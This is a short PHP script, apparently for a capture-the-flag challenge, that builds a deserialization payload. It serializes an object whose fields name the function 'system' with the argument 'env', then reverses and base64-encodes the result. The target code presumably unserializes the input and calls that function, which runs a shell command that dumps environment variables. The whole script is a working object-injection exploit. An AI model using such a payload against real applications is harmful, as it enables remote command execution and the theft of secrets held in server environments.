<?php
class A{
    public $className;
    public $funcName;
    public $args;
    public function __construct(){
        $this->className="B";
        $this->funcName="system";
        $this->args="env";
    }
}
class B{
}
$a=new A;
echo(base64_encode(strrev(serialize($a))));
